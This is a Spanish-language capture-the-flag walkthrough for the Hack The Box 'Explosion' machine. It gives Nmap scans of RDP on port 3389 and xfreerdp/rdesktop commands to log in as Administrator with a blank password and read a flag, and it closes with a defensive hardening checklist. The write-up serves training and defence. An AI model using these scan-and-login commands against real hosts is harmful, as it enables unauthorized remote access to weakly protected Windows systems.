# Hack The Box — Starting Point 5: Explosion

Notas sobre **RDP** (*Remote Desktop Protocol*) en Windows, puerto **3389/tcp**, escaneo con **Nmap** y conexión gráfica con **`xfreerdp`** / **`rdesktop`** usando credenciales débiles (usuario `Administrator` con contraseña vacía).

---

## Contexto

**Explosion** es la primera máquina **Windows** del *Starting Point* enfocada en escritorio remoto. RDP permite controlar un Windows como si estuvieras delante físicamente. Por defecto escucha en **3389/tcp** y, mal configurado, acepta cuentas con contraseñas débiles o en blanco — vector clásico de compromiso inicial en pentests reales.

El reto: escanear, identificar RDP, conectarse como `Administrator` con contraseña vacía y leer la flag en el escritorio.

---

## Conceptos del módulo (respuestas a las tareas)

### Tarea 1 — ¿Qué entorno de escritorio se usa por defecto en Windows?

**Aero** (clásico en Windows 7) o, en versiones más recientes, **Fluent / Modern UI**. En la pregunta canónica del room la respuesta aceptada suele ser **Aero** (la “shell” del escritorio de Windows). El concepto clave: en Windows hablamos de *shell de escritorio* + *Window Manager* + *Compositor* integrados, no de DEs estilo Linux.

### Tarea 2 — ¿Qué protocolo se utiliza para conectar a un escritorio remoto Windows desde una máquina Linux?

**RDP** = **Remote Desktop Protocol**. Protocolo propietario de Microsoft para sesiones gráficas remotas. En Linux se consume con clientes como **FreeRDP** (`xfreerdp`) o **rdesktop**.

### Tarea 3 — ¿Qué flag se usa con Nmap para realizar un escaneo de versión?

**`-sV`**. Intenta determinar el software y versión que corre detrás de cada puerto abierto (banner grabbing, sondas y huellas).

### Tarea 4 — ¿Cuál es el puerto por defecto utilizado para RDP?

**3389/tcp**.

### Tarea 5 — ¿Qué utilidad de línea de comandos podemos usar para conectarnos a una sesión RDP desde nuestra máquina Linux?

**`xfreerdp`** (parte del proyecto **FreeRDP**). Alternativa: **`rdesktop`** (más antiguo, menos mantenido) y **Remmina** (GUI).

```bash
sudo apt install freerdp2-x11
```

### Tarea 6 — Flag para acceder a `Administrator` con contraseña vacía

Hay que **pasar usuario sin contraseña y permitir contraseña en blanco** en `xfreerdp`:

```bash
xfreerdp /v:TARGET_IP /u:Administrator /p:
```

- `/v:`: IP/host destino.
- `/u:`: usuario (`Administrator`).
- `/p:`: contraseña; aquí vacía. En algunas versiones también hace falta `/cert:ignore` para evitar el aviso de certificado.

## Metodología

### 1. Conectividad

```bash
ping -c 4 TARGET_IP
```

*(Windows puede bloquear ICMP; si no responde no significa que esté caída.)*

### 2. Nmap dirigido a Windows

```bash
nmap -sV -p- --min-rate=1000 TARGET_IP
```

Esperado: `3389/tcp open ms-wbt-server`. Con `-sV` puedes ver `Microsoft Terminal Services`.

**Solo RDP con detalle:**

```bash
nmap -p 3389 -sV --script rdp-enum-encryption,rdp-ntlm-info TARGET_IP
```

- `rdp-enum-encryption`: niveles de cifrado/CredSSP soportados.
- `rdp-ntlm-info`: a veces filtra hostname, dominio y versión exacta de Windows.

## Conexión RDP desde Linux

### Con `xfreerdp` (recomendado)

```bash
xfreerdp /v:TARGET_IP /u:Administrator /p: /cert:ignore /dynamic-resolution +clipboard
```

Desglose de flags útiles:

| Flag | Función |
|------|---------|
| `/v:HOST` | Destino de la conexión |
| `/u:USUARIO` | Usuario (p. ej. `Administrator`) |
| `/p:PASSWORD` | Contraseña; vacío con `/p:` |
| `/d:DOMINIO` | Dominio (si aplica) |
| `/cert:ignore` | Acepta el certificado sin validar |
| `/cert:tofu` | *Trust on first use* (alternativa) |
| `/size:1280x800` | Tamaño fijo de la ventana |
| `/dynamic-resolution` | Ventana redimensionable |
| `+clipboard` | Comparte portapapeles |
| `/drive:share,/ruta` | Monta carpeta local como unidad remota |
| `/bpp:32` | Profundidad de color |

### Con `rdesktop` (alternativa clásica)

```bash
rdesktop -u Administrator -p "" TARGET_IP
```

### Con `remmina` (GUI)

Abrir Remmina → nuevo perfil RDP → IP, usuario `Administrator`, dejar contraseña en blanco → conectar.

### Si `xfreerdp` falla por seguridad NLA

Algunos servidores exigen **NLA** (Network Level Authentication). Si tu cliente lo desactiva, puede no conectar:

```bash
xfreerdp /v:TARGET_IP /u:Administrator /p: /cert:ignore /sec:rdp
```

- `/sec:rdp`: fuerza nivel “Standard RDP Security” cuando el server lo acepta.

## Una vez dentro del escritorio

1. Mira el **Escritorio** del usuario `Administrator`; la flag suele estar como `flag.txt` o similar.
2. Si necesitas terminal: `Win + R` → `cmd` o `powershell`.
3. Lectura rápida desde `cmd`:

```cmd
type C:\Users\Administrator\Desktop\flag.txt
```

o desde PowerShell:

```powershell
Get-Content C:\Users\Administrator\Desktop\flag.txt
```

---

## Por qué este escenario es realista

- Cuentas privilegiadas con contraseñas vacías o triviales.
- RDP **expuesto a Internet** (search engines como Shodan/Censys lo confirman a diario).
- Falta de **NLA**, ausencia de **2FA** y de bloqueo por intentos fallidos.
- Ataques reales: **password spraying**, **credential stuffing**, **BlueKeep** (CVE-2019-0708) en versiones sin parchear.

### Mini-checklist defensivo

- Nunca exponer 3389 directamente; usar **VPN** o **bastión / RD Gateway**.
- Forzar **NLA** y políticas de bloqueo por intentos fallidos.
- Contraseñas largas + **MFA** (Azure MFA, Duo, etc.).
- Parchear y monitorizar logs de **Eventos 4624/4625** (logon success/failure).

## Resumen de comandos

| Comando | Propósito |
|---------|-----------|
| `nmap -sV -p- TARGET_IP` | Confirmar 3389/tcp abierto y versión |
| `nmap -p 3389 --script rdp-ntlm-info TARGET_IP` | Fingerprint extra del servicio |
| `xfreerdp /v:IP /u:Administrator /p: /cert:ignore` | Sesión RDP con contraseña vacía |
| `rdesktop -u Administrator -p "" IP` | Alternativa clásica |
| `type C:\Users\Administrator\Desktop\flag.txt` | Leer la flag dentro de Windows |

---

## Checklist

1. VPN HTB activa
2. `nmap -sV -p-` → **3389/tcp ms-wbt-server**
3. `xfreerdp /v:IP /u:Administrator /p: /cert:ignore`
4. Aceptar certificado si lo pide
5. Buscar `flag.txt` en el Escritorio
6. Leer el contenido y enviar la flag a HTB
